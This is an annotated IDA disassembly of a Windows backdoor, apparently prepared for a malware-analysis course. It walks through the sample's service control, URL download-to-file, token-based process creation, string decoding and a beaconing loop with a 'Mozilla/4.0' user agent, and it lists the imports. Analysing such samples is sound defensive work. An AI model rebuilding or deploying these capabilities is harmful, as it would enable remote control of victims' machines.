.text:0040273A cmp     eax, 424h       ; ;check if error was because service didn't exist
.text:0040273F jnz     short loc_402748 ; jump if error due to another reason
.text:00402741 push    offset aServiceDoesNot ; "\r\nService does not exist!\r\n"
.text:00402746 jmp     short loc_40274D
.text:00402748
.text:00402748 loc_402748:
.text:00402748 push    offset aStartserviceFa ; "\r\nStartService failed!\r\n"
.text:0040274D
.text:0040274D loc_40274D:             ; Destination
.text:0040274D push    [ebp+Destination]
.text:00402750 call    strcat          ; concatenate error to destination
.text:00402755 pop     ecx
.text:00402756 pop     ecx
.text:00402757 push    ebx             ; hSCObject
.text:00402758 call    ds:CloseServiceHandle ; close service handle
.text:0040275E jmp     short loc_4027A3
.text:00402760
.text:00402760 loc_402760:             ; lpServiceArgVectors
.text:00402760 push    esi
.text:00402761 push    esi             ; dwNumServiceArgs
.text:00402762 push    edi             ; hService
.text:00402763 call    ds:StartServiceA ; starts service
.text:00402769 test    eax, eax        ; checking if starting was successful
.text:0040276B jz      short loc_402774 ; jump if starting service wasn't successful
.text:0040276D push    offset aServiceStarted ; "\r\nService started!\r\n"
.text:00402772 jmp     short loc_40278D
.text:00402774
.text:00402774 loc_402774:             ; if starting service failed get error code
.text:00402774 call    ds:GetLastError
.text:0040277A cmp     eax, 420h       ; check if error was because service is already running
.text:0040277F jnz     short loc_402788 ; jump if there is another reason why the service didn't start
.text:00402781 push    offset aServiceIsRunni ; "\r\nService is running already!\r\n"
.text:00402786 jmp     short loc_40278D
.text:00402788
.text:00402788 loc_402788:
.text:00402788 push    offset aStartserviceFa ; "\r\nStartService failed!\r\n"
.text:0040278D
.text:0040278D loc_40278D:             ; Destination
.text:0040278D push    [ebp+Destination]
.text:00402790 call    strcat
.text:00402795 mov     esi, ds:CloseServiceHandle
.text:0040279B pop     ecx
.text:0040279C pop     ecx
.text:0040279D push    edi             ; hSCObject
.text:0040279E call    esi ; CloseServiceHandle
.text:004027A0 push    ebx             ; hObject
.text:004027A1
.text:004027A1 loc_4027A1:
.text:004027A1 call    esi ; CloseHandle
.text:004027A3
.text:004027A3 loc_4027A3:
.text:004027A3 pop     edi
.text:004027A4 pop     esi
.text:004027A5 pop     ebx
.text:004027A6 leave
.text:004027A7 retn
.text:004027A7 StartService endp
.text:004027A7
.text:004027A8
.text:004027A8
.text:004027A8
.text:004027A8 ; int __cdecl CallsCreateProcessInSwitchStatement(char *Destination)
.text:004027A8 CallsCreateProcessInSwitchStatement proc near
.text:004027A8
.text:004027A8 Destination= dword ptr  4
.text:004027A8
.text:004027A8 cmp     lpServiceName, 0 ; check if serviceName is empty
.text:004027AF jz      short loc_4027D5 ; jump if serviceName is empty
.text:004027B1 mov     eax, Str
.text:004027B6 test    eax, eax        ; check if Str is empty
.text:004027B8 jz      short loc_4027D5 ; jump if Str is empty
.text:004027BA push    eax             ; String
.text:004027BB call    ds:atol         ; convert Str to long, this is processId
.text:004027C1 push    eax             ; dwProcessId
.text:004027C2 push    lpServiceName   ; int
.text:004027C8 push    [esp+0Ch+Destination] ; Destination
.text:004027CC call    CreateProcessInSwitchStatement
.text:004027D1 add     esp, 10h
.text:004027D4 retn
.text:004027D5
.text:004027D5 loc_4027D5:
.text:004027D5 push    offset aSyntaxError ; "Syntax error!\n"
.text:004027DA push    [esp+4+Destination] ; Destination
.text:004027DE call    strcat          ; concatenate syntax error to destination to inform malware author
.text:004027E3 pop     ecx
.text:004027E4 pop     ecx
.text:004027E5 retn
.text:004027E5 CallsCreateProcessInSwitchStatement endp
.text:004027E5
.text:004027E6
.text:004027E6
.text:004027E6
.text:004027E6 ; int __cdecl DownloadBitsToFile(char *Destination)
.text:004027E6 DownloadBitsToFile proc near
.text:004027E6
.text:004027E6 Destination= dword ptr  4
.text:004027E6
.text:004027E6 mov     ecx, Str
.text:004027EC xor     edx, edx        ; clear edx
.text:004027EE cmp     ecx, edx        ; check if Str is empty
.text:004027F0 jz      short loc_402806 ; jump if Str is empty
.text:004027F2 mov     eax, lpServiceName
.text:004027F7 cmp     eax, edx        ; check if serviceName is valid
.text:004027F9 jz      short loc_402806 ; jump if not valid
.text:004027FB push    edx             ; LPBINDSTATUSCALLBACK
.text:004027FC push    edx             ; DWORD
.text:004027FD push    eax             ; LPCSTR
.text:004027FE push    ecx             ; LPCSTR
.text:004027FF push    edx             ; LPUNKNOWN
.text:00402800 call    URLDownloadToFileA ; downloads bits from internet and saves them to a file
.text:00402805 retn
.text:00402806
.text:00402806 loc_402806:
.text:00402806 push    offset aSyntaxErrorUsa_2 ; "\r\nSyntax error!\tUsage:\tGetUrl URL F"...
.text:0040280B push    [esp+4+Destination] ; Destination
.text:0040280F call    strcat          ; concatenate error message to destination
.text:00402814 pop     ecx
.text:00402815 pop     ecx
.text:00402816 retn
.text:00402816 DownloadBitsToFile endp
.text:00402816
.text:00402817
.text:00402817
.text:00402817 ; Attributes: bp-based frame
.text:00402817
.text:00402817 ; int __cdecl CreateProcessInSwitchStatement(char *Destination, int, DWORD dwProcessId)
.text:00402817 CreateProcessInSwitchStatement proc near
.text:00402817
.text:00402817 CommandLine= byte ptr -260h
.text:00402817 Buffer= byte ptr -15Ch
.text:00402817 StartupInfo= _STARTUPINFOA ptr -5Ch
.text:00402817 ProcessInformation= _PROCESS_INFORMATION ptr -18h
.text:00402817 var_8= dword ptr -8
.text:00402817 TokenHandle= dword ptr -4
.text:00402817 Destination= dword ptr  8
.text:00402817 arg_4= dword ptr  0Ch
.text:00402817 dwProcessId= dword ptr  10h
.text:00402817
.text:00402817 push    ebp
.text:00402818 mov     ebp, esp
.text:0040281A sub     esp, 260h
.text:00402820 push    edi
.text:00402821 xor     edi, edi        ; clear edi
.text:00402823 cmp     [ebp+dwProcessId], edi ; check if dwProcessId = 0
.text:00402826 mov     [ebp+var_8], edi
.text:00402829 jnz     short loc_402833 ; if dwProcessId isnt 0 jump
.text:0040282B call    ds:GetCurrentProcess ; retrieves a handle for the current process running
.text:00402831 jmp     short loc_402842 ; check if handle is valid
.text:00402833
.text:00402833 loc_402833:             ; dwProcessId
.text:00402833 push    [ebp+dwProcessId]
.text:00402836 push    edi             ; bInheritHandle
.text:00402837 push    1F0FFFh         ; dwDesiredAccess
.text:0040283C call    ds:OpenProcess  ; opens existing local process object specified by processId
.text:00402842
.text:00402842 loc_402842:             ; check if handle is valid
.text:00402842 cmp     eax, 0FFFFFFFFh
.text:00402845 mov     [ebp+dwProcessId], eax
.text:00402848 jnz     short loc_40287C ; jump if handle is valid
.text:0040284A call    ds:GetLastError ; if handle isn't valid get the error
.text:00402850 push    eax
.text:00402851 lea     eax, [ebp+Buffer]
.text:00402857 push    offset aFailedWithD ; "Failed with %d!\n"
.text:0040285C push    eax             ; Buffer
.text:0040285D call    ds:sprintf      ; print out the error code that caused the issue
.text:00402863 lea     eax, [ebp+Buffer]
.text:00402869 push    eax             ; Source
.text:0040286A push    [ebp+Destination] ; Destination
.text:0040286D call    strcat          ; concatenate error message to destination
.text:00402872 add     esp, 14h
.text:00402875 xor     eax, eax        ; clear eax
.text:00402877 jmp     loc_40297A
.text:0040287C
.text:0040287C loc_40287C:
.text:0040287C lea     eax, [ebp+TokenHandle]
.text:0040287F push    esi
.text:00402880 push    eax             ; TokenHandle
.text:00402881 push    0Bh             ; DesiredAccess
.text:00402883 push    [ebp+dwProcessId] ; ProcessHandle
.text:00402886 call    ds:OpenProcessToken ; if handle is valid, openProcessToken, gets token associated with a process
.text:0040288C mov     esi, ds:CloseHandle
.text:00402892 test    eax, eax        ; check if getting access token worked
.text:00402894 jz      loc_402946      ; jump if getting token didn't work
.text:0040289A push    ebx
.text:0040289B push    44h ; 'D'
.text:0040289D pop     ebx
.text:0040289E lea     eax, [ebp+StartupInfo]
.text:004028A1 push    ebx             ; Size
.text:004028A2 push    edi             ; Val
.text:004028A3 push    eax             ; void *
.text:004028A4 call    memset          ; setting memory at eax to empty
.text:004028A9 push    [ebp+arg_4]
.text:004028AC lea     eax, [ebp+CommandLine]
.text:004028B2 mov     [ebp+StartupInfo.cb], ebx
.text:004028B5 mov     ebx, ds:sprintf
.text:004028BB push    offset aS_0     ; "\"%s\""
.text:004028C0 push    eax             ; Buffer
.text:004028C1 mov     [ebp+StartupInfo.dwFlags], 1
.text:004028C8 mov     [ebp+StartupInfo.wShowWindow], di
.text:004028CC call    ebx ; sprintf   ; printing startUpInfo information
.text:004028CE add     esp, 18h
.text:004028D1 lea     eax, [ebp+ProcessInformation]
.text:004028D4 push    eax             ; lpProcessInformation
.text:004028D5 lea     eax, [ebp+StartupInfo]
.text:004028D8 push    eax             ; lpStartupInfo
.text:004028D9 push    edi             ; lpCurrentDirectory
.text:004028DA push    edi             ; lpEnvironment
.text:004028DB push    edi             ; dwCreationFlags
.text:004028DC push    1               ; bInheritHandles
.text:004028DE push    edi             ; lpThreadAttributes
.text:004028DF lea     eax, [ebp+CommandLine]
.text:004028E5 push    edi             ; lpProcessAttributes
.text:004028E6 push    eax             ; lpCommandLine
.text:004028E7 push    edi             ; lpApplicationName
.text:004028E8 push    [ebp+TokenHandle] ; hToken
.text:004028EB call    ds:CreateProcessAsUserA ; creates new process in security context of user specified by hToken
.text:004028F1 test    eax, eax        ; testing if creating process worked
.text:004028F3 jz      short loc_402917 ; jump if creating process failed
.text:004028F5 push    offset aOk_1    ; "OK!\n"
.text:004028FA push    [ebp+Destination] ; Destination
.text:004028FD call    strcat          ; concatenate that process was started okay to destination
.text:00402902 pop     ecx
.text:00402903 pop     ecx
.text:00402904 push    [ebp+ProcessInformation.hProcess] ; hObject
.text:00402907 call    esi ; CloseHandle ; close handle to process
.text:00402909 push    [ebp+ProcessInformation.hThread] ; hObject
.text:0040290C call    esi ; CloseHandle ; close handle to thread
.text:0040290E mov     [ebp+var_8], 1
.text:00402915 jmp     short loc_40293E
.text:00402917
.text:00402917 loc_402917:             ; get error if creatingProcess failed
.text:00402917 call    ds:GetLastError
.text:0040291D push    eax
.text:0040291E lea     eax, [ebp+Buffer]
.text:00402924 push    offset aCreateFailedWi ; "Create failed with %d!\n"
.text:00402929 push    eax             ; Buffer
.text:0040292A call    ebx ; sprintf   ; print out cause of error
.text:0040292C lea     eax, [ebp+Buffer]
.text:00402932 push    eax             ; Source
.text:00402933 push    [ebp+Destination] ; Destination
.text:00402936 call    strcat          ; concatenate error to destination
.text:0040293B add     esp, 14h
.text:0040293E
.text:0040293E loc_40293E:             ; hObject
.text:0040293E push    [ebp+TokenHandle]
.text:00402941 call    esi ; CloseHandle ; close handle to token
.text:00402943 pop     ebx
.text:00402944 jmp     short loc_402971
.text:00402946
.text:00402946 loc_402946:             ; get error if getting access token didn't work
.text:00402946 call    ds:GetLastError
.text:0040294C push    eax
.text:0040294D lea     eax, [ebp+Buffer]
.text:00402953 push    offset aFailedWithD ; "Failed with %d!\n"
.text:00402958 push    eax             ; Buffer
.text:00402959 call    ds:sprintf      ; print error to indicate what caused the error
.text:0040295F lea     eax, [ebp+Buffer]
.text:00402965 push    eax             ; Source
.text:00402966 push    [ebp+Destination] ; Destination
.text:00402969 call    strcat          ; concatenate error to destination
.text:0040296E add     esp, 14h
.text:00402971
.text:00402971 loc_402971:             ; hObject
.text:00402971 push    [ebp+dwProcessId]
.text:00402974 call    esi ; CloseHandle ; close handle to processId
.text:00402976 mov     eax, [ebp+var_8]
.text:00402979 pop     esi
.text:0040297A
.text:0040297A loc_40297A:
.text:0040297A pop     edi
.text:0040297B leave
.text:0040297C retn
.text:0040297C CreateProcessInSwitchStatement endp
.text:0040297C
.text:0040297D
.text:0040297D
.text:0040297D ; Neel Narvekar & Tony Wineman
.text:0040297D ; Attributes: bp-based frame
.text:0040297D
.text:0040297D ; int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
.text:0040297D _WinMain@16 proc near
.text:0040297D
.text:0040297D Destination= byte ptr -28h
.text:0040297D Buffer= byte ptr -27h
.text:0040297D nSize= dword ptr -4
.text:0040297D hInstance= dword ptr  8
.text:0040297D hPrevInstance= dword ptr  0Ch
.text:0040297D lpCmdLine= dword ptr  10h
.text:0040297D nShowCmd= dword ptr  14h
.text:0040297D
.text:0040297D push    ebp             ; pushing extended base pointer onto stack
.text:0040297E mov     ebp, esp
.text:00402980 sub     esp, 28h
.text:00402983 push    ebx
.text:00402984 push    esi             ; storing values onto stack
.text:00402985 mov     esi, offset aEaaeUAieeaaoou ; "\\\\"
.text:0040298A push    edi
.text:0040298B push    esi             ; Str
.text:0040298C call    strlen          ; calling string length on string stored in esi
.text:00402991 mov     [ebp+nSize], eax ; storing length of string in offset nsize from base pointer
.text:00402994 inc     eax
.text:00402995 push    eax             ; unsigned int
.text:00402996 call    ??2@YAPAXI@Z    ; operator new(uint)
.text:0040299B mov     edi, eax
.text:0040299D xor     ebx, ebx        ; clearing ebx register
.text:0040299F pop     ecx             ; ecx = edi = eax
.text:004029A0 cmp     edi, ebx        ; does edi = 0?
.text:004029A2 pop     ecx             ; ecx = esi
.text:004029A3 jnz     short loc_4029AD ; jump if edi != 0
.text:004029A5 push    1
.text:004029A7 pop     eax             ; eax = 1
.text:004029A8 jmp     loc_402A42
.text:004029AD
.text:004029AD loc_4029AD:
.text:004029AD mov     eax, [ebp+nSize]
.text:004029B0 inc     eax
.text:004029B1 push    eax             ; Size
.text:004029B2 push    ebx             ; Val
.text:004029B3 push    edi             ; void *
.text:004029B4 call    memset          ; this is clearing out the memory at edi
.text:004029B9 add     esp, 0Ch        ; shifting stack pointer by 12 bytes
.text:004029BC xor     ecx, ecx        ; zeroing out ecx
.text:004029BE cmp     [ebp+nSize], ebx ; comparing original eax value with ebx
.text:004029C1 jbe     short loc_4029D8 ; jump if original eax value is less than or equal to 0
.text:004029C3 mov     eax, edi
.text:004029C5 sub     esi, edi
.text:004029C7
.text:004029C7 loc_4029C7:             ; dl = mem[esi]
.text:004029C7 mov     dl, [esi+eax]
.text:004029CA sar     dl, 1           ; shift dl right 1 arithmetic
.text:004029CC and     dl, 7Fh         ; gets rid of sign extension
.text:004029CF inc     ecx             ; ecx++
.text:004029D0 mov     [eax], dl       ; store dl at mem location eax
.text:004029D2 inc     eax             ; eax = eax + 1
.text:004029D3 cmp     ecx, [ebp+nSize] ; loop until ecx = ebp + nSize
.text:004029D6 jb      short loc_4029C7 ; dl = mem[esi]
.text:004029D8
.text:004029D8 loc_4029D8:
.text:004029D8 lea     eax, [ebp+nSize]
.text:004029DB mov     [ebp+nSize], 23h ; '#'
.text:004029E2 push    eax             ; nSize
.text:004029E3 lea     eax, [ebp+Buffer]
.text:004029E6 push    eax             ; lpBuffer
.text:004029E7 mov     [ebp+Destination], 2Fh ; '/'
.text:004029EB call    ds:GetComputerNameA ; preparing arguments for call to GetComputerNameA
.text:004029F1 test    eax, eax        ; testing if getComputerNameA has valid output
.text:004029F3 jnz     short loc_4029F8 ; zeroing eax
.text:004029F5 mov     [ebp+Destination], bl ; putting 0 in memory at destination
.text:004029F8
.text:004029F8 loc_4029F8:             ; zeroing eax
.text:004029F8 lea     eax, [ebp+Destination]
.text:004029FB push    offset asc_4046C4 ; "/"
.text:00402A00 push    eax             ; Destination
.text:00402A01 call    strcat          ; concatenating eax with /
.text:00402A06 pop     ecx             ; strct is cdecl, so stack cleanup is on caller
.text:00402A07 pop     ecx
.text:00402A08
.text:00402A08 loc_402A08:
.text:00402A08 cmp     dword_4047A4, ebx
.text:00402A0E jnz     short loc_402A40
.text:00402A10 lea     eax, [ebp+Destination]
.text:00402A13 push    1               ; String2
.text:00402A15 push    eax             ; Destination
.text:00402A16 push    offset aMozilla40 ; "Mozilla/4.0"
.text:00402A1B push    edi             ; char *
.text:00402A1C call    ThickBoi
.text:00402A21 add     esp, 10h
.text:00402A24 cmp     dword_4047A4, ebx
.text:00402A2A jnz     short loc_402A40
.text:00402A2C mov     eax, dword_4046B4
.text:00402A31 imul    eax, 0EA60h
.text:00402A37 push    eax             ; dwMilliseconds
.text:00402A38 call    ds:Sleep
.text:00402A3E jmp     short loc_402A08
.text:00402A40
.text:00402A40 loc_402A40:
.text:00402A40 xor     eax, eax
.text:00402A42
.text:00402A42 loc_402A42:
.text:00402A42 pop     edi
.text:00402A43 pop     esi
.text:00402A44 pop     ebx
.text:00402A45 leave
.text:00402A46 retn    10h
.text:00402A46 _WinMain@16 endp
.text:00402A46
.text:00402A49 align 2
.text:00402A4A ; [00000006 BYTES: COLLAPSED FUNCTION Process32Next. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00402A50 ; [00000006 BYTES: COLLAPSED FUNCTION Process32First. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00402A56 ; [00000006 BYTES: COLLAPSED FUNCTION CreateToolhelp32Snapshot. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00402A5C ; [00000006 BYTES: COLLAPSED FUNCTION operator delete(void *). PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00402A62 ; [00000006 BYTES: COLLAPSED FUNCTION strlen. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00402A68 ; [00000006 BYTES: COLLAPSED FUNCTION strcpy. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00402A6E ; [00000006 BYTES: COLLAPSED FUNCTION operator new(uint). PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00402A74 ; [00000006 BYTES: COLLAPSED FUNCTION memset. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00402A7A ; [00000006 BYTES: COLLAPSED FUNCTION strcat. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00402A80 ; [00000006 BYTES: COLLAPSED FUNCTION __CxxFrameHandler. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00402A86 align 10h
.text:00402A90 ; [0000001F BYTES: COLLAPSED FUNCTION __EH_prolog. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00402AAF ; [0000015E BYTES: COLLAPSED FUNCTION start. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00402C0D align 2
.text:00402C0E ; [00000006 BYTES: COLLAPSED FUNCTION _XcptFilter. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00402C14 ; [00000006 BYTES: COLLAPSED FUNCTION _initterm. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00402C1A ; [00000012 BYTES: COLLAPSED FUNCTION __setdefaultprecision. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00402C2C
.text:00402C2C
.text:00402C2C
.text:00402C2C ; int __cdecl UserMathErrorFunction(struct _exception *)
.text:00402C2C UserMathErrorFunction proc near
.text:00402C2C xor     eax, eax
.text:00402C2E retn
.text:00402C2E UserMathErrorFunction endp
.text:00402C2E
.text:00402C2F ; [00000001 BYTES: COLLAPSED FUNCTION nullsub_1. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00402C30 ; [00000006 BYTES: COLLAPSED FUNCTION _except_handler3. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00402C36 ; [00000006 BYTES: COLLAPSED FUNCTION _controlfp. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00402C3C ; [00000006 BYTES: COLLAPSED FUNCTION URLDownloadToFileA. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00402C42 ; [00000006 BYTES: COLLAPSED FUNCTION GetUserNameExA. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00402C48 ; START OF FUNCTION CHUNK FOR ThickBoi
.text:00402C48
.text:00402C48 loc_402C48:
.text:00402C48 ; __unwind { // loc_402C50
.text:00402C48 ;   cleanup() // owned by 4014A3
.text:00402C48 lea     ecx, [ebp+var_5C]
.text:00402C4B jmp     NearEnd
.text:00402C50
.text:00402C50 loc_402C50:
.text:00402C50 mov     eax, offset stru_403168
.text:00402C55 jmp     __CxxFrameHandler
.text:00402C55 ; } // starts at 402C48
.text:00402C55 ; END OF FUNCTION CHUNK FOR ThickBoi
.text:00402C5A align 4
.text:00402C5C ; START OF FUNCTION CHUNK FOR StartAddress
.text:00402C5C
.text:00402C5C loc_402C5C:
.text:00402C5C ; __unwind { // loc_402C64
.text:00402C5C ;   cleanup() // owned by 4022CE
.text:00402C5C lea     ecx, [ebp+var_4C]
.text:00402C5F jmp     NearEnd
.text:00402C64
.text:00402C64 loc_402C64:
.text:00402C64 mov     eax, offset stru_403190
.text:00402C69 jmp     __CxxFrameHandler
.text:00402C69 ; } // starts at 402C5C
.text:00402C69 ; END OF FUNCTION CHUNK FOR StartAddress
.text:00402C6E align 200h
.text:00402E00 dd 80h dup(?)
.text:00402E00 _text ends
.text:00402E00
.idata:00403000 ; Section 2. (virtual address 00003000)
.idata:00403000 ; Virtual size                  : 000008EE (   2286.)
.idata:00403000 ; Section size in file          : 00000A00 (   2560.)
.idata:00403000 ; Offset to raw data for section: 00002200
.idata:00403000 ; Flags 40000040: Data Readable
.idata:00403000 ; Alignment     : default
.idata:00403000 ;
.idata:00403000 ; Imports from ADVAPI32.dll
.idata:00403000 ;
.idata:00403000
.idata:00403000 ; Segment type: Externs
.idata:00403000 ; _idata
.idata:00403000 ; BOOL (__stdcall *CreateProcessAsUserA)(HANDLE hToken, LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
.idata:00403000 extrn CreateProcessAsUserA:dword
.idata:00403004 ; BOOL (__stdcall *CloseServiceHandle)(SC_HANDLE hSCObject)
.idata:00403004 extrn CloseServiceHandle:dword
.idata:00403008 ; BOOL (__stdcall *EnumServicesStatusExA)(SC_HANDLE hSCManager, SC_ENUM_TYPE InfoLevel, DWORD dwServiceType, DWORD dwServiceState, LPBYTE lpServices, DWORD cbBufSize, LPDWORD pcbBytesNeeded, LPDWORD lpServicesReturned, LPDWORD lpResumeHandle, LPCSTR pszGroupName)
.idata:00403008 extrn EnumServicesStatusExA:dword
.idata:0040300C ; SC_HANDLE (__stdcall *OpenSCManagerA)(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess)
.idata:0040300C extrn OpenSCManagerA:dword
.idata:00403010 ; BOOL (__stdcall *ControlService)(SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus)
.idata:00403010 extrn ControlService:dword
.idata:00403014 ; SC_HANDLE (__stdcall *OpenServiceA)(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess)
.idata:00403014 extrn OpenServiceA:dword
.idata:00403018 ; BOOL (__stdcall *StartServiceA)(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCSTR *lpServiceArgVectors)
.idata:00403018 extrn StartServiceA:dword
.idata:0040301C ; BOOL (__stdcall *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle)
.idata:0040301C extrn OpenProcessToken:dword
.idata:00403020
.idata:00403024 ;
.idata:00403024 ; Imports from KERNEL32.dll
.idata:00403024 ;
.idata:00403024 ; BOOL (__stdcall *GetComputerNameA)(LPSTR lpBuffer, LPDWORD nSize)
.idata:00403024 extrn GetComputerNameA:dword
.idata:00403028 ; BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
.idata:00403028 extrn WriteFile:dword
.idata:0040302C ; BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)
.idata:0040302C extrn ReadFile:dword
.idata:00403030 ; BOOL (__stdcall *PeekNamedPipe)(HANDLE hNamedPipe, LPVOID lpBuffer, DWORD nBufferSize, LPDWORD lpBytesRead, LPDWORD lpTotalBytesAvail, LPDWORD lpBytesLeftThisMessage)
.idata:00403030 extrn PeekNamedPipe:dword
.idata:00403034 ; BOOL (__stdcall *GetExitCodeProcess)(HANDLE hProcess, LPDWORD lpExitCode)
.idata:00403034 extrn GetExitCodeProcess:dword
.idata:00403038 ; BOOL (__stdcall *CreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
.idata:00403038 extrn CreateProcessA:dword
.idata:0040303C ; HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
.idata:0040303C extrn OpenProcess:dword
.idata:00403040 ; DWORD (__stdcall *GetFileAttributesA)(LPCSTR lpFileName)
.idata:00403040 extrn GetFileAttributesA:dword
.idata:00403044 ; UINT (__stdcall *GetSystemDirectoryA)(LPSTR lpBuffer, UINT uSize)
.idata:00403044 extrn GetSystemDirectoryA:dword
.idata:00403048 ; void (__stdcall *Sleep)(DWORD dwMilliseconds)
.idata:00403048 extrn Sleep:dword
.idata:0040304C ; BOOL (__stdcall *GetVolumeInformationA)(LPCSTR lpRootPathName, LPSTR lpVolumeNameBuffer, DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength, LPDWORD lpFileSystemFlags, LPSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize)
.idata:0040304C extrn GetVolumeInformationA:dword
.idata:00403050 ; UINT (__stdcall *GetDriveTypeA)(LPCSTR lpRootPathName)
.idata:00403050 extrn GetDriveTypeA:dword
.idata:00403054 ; LPSTR (__stdcall *lstrcatA)(LPSTR lpString1, LPCSTR lpString2)
.idata:00403054 extrn lstrcatA:dword
.idata:00403058 ; DWORD (__stdcall *GetLogicalDrives)()
.idata:00403058 extrn GetLogicalDrives:dword
.idata:0040305C ; BOOL (__stdcall *Process32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)
.idata:0040305C extrn __imp_Process32Next:dword
.idata:00403060 ; BOOL (__stdcall *Process32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)
.idata:00403060 extrn __imp_Process32First:dword
.idata:00403064 ; HANDLE (__stdcall *CreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID)
.idata:00403064 extrn __imp_CreateToolhelp32Snapshot:dword
.idata:00403068 ; DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh)
.idata:00403068 extrn GetFileSize:dword
.idata:0040306C ; HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
.idata:0040306C extrn CreateFileA:dword
.idata:00403070 ; HANDLE (__stdcall *GetCurrentProcess)()
.idata:00403070 extrn GetCurrentProcess:dword
.idata:00403074 ; HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName)
.idata:00403074 extrn GetModuleHandleA:dword
.idata:00403078 ; BOOL (__stdcall *CreatePipe)(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize)
.idata:00403078 extrn CreatePipe:dword
.idata:0040307C ; UINT (__stdcall *GetWindowsDirectoryA)(LPSTR lpBuffer, UINT uSize)
.idata:0040307C extrn GetWindowsDirectoryA:dword
.idata:00403080 ; BOOL (__stdcall *SetCurrentDirectoryA)(LPCSTR lpPathName)
.idata:00403080 extrn SetCurrentDirectoryA:dword
.idata:00403084 ; HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
.idata:00403084 extrn CreateThread:dword
.idata:00403088 ; DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds)
.idata:00403088 extrn WaitForSingleObject:dword
.idata:0040308C ; BOOL (__stdcall *CloseHandle)(HANDLE hObject)
.idata:0040308C extrn CloseHandle:dword
.idata:00403090 ; BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode)
.idata:00403090 extrn TerminateProcess:dword
.idata:00403094 ; DWORD (__stdcall *ExpandEnvironmentStringsA)(LPCSTR lpSrc, LPSTR lpDst, DWORD nSize)
.idata:00403094 extrn ExpandEnvironmentStringsA:dword
.idata:00403098 ; DWORD (__stdcall *GetLastError)()
.idata:00403098 extrn GetLastError:dword
.idata:0040309C ; void (__stdcall *GetStartupInfoA)(LPSTARTUPINFOA lpStartupInfo)
.idata:0040309C extrn GetStartupInfoA:dword
.idata:004030A0
.idata:004030A4 ;
.idata:004030A4 ; Imports from MSVCRT.dll
.idata:004030A4 ;
.idata:004030A4 ; int (__cdecl *atol)(const char *String)
.idata:004030A4 extrn atol:dword
.idata:004030A8 ; int (*sscanf)(const char *const Buffer, const char *const Format, ...)
.idata:004030A8 extrn sscanf:dword
.idata:004030AC ; char *(__cdecl *strrchr)(const char *Str, int Ch)
.idata:004030AC extrn strrchr:dword
.idata:004030B0 ; void (__cdecl __noreturn *exit)(int Code)
.idata:004030B0 extrn _exit:dword
.idata:004030B4 extrn __imp__XcptFilter:dword
.idata:004030B8 ; void (__cdecl __noreturn *exit)(int Code)
.idata:004030B8 extrn exit:dword
.idata:004030BC ; char *acmdln
.idata:004030BC extrn _acmdln:dword
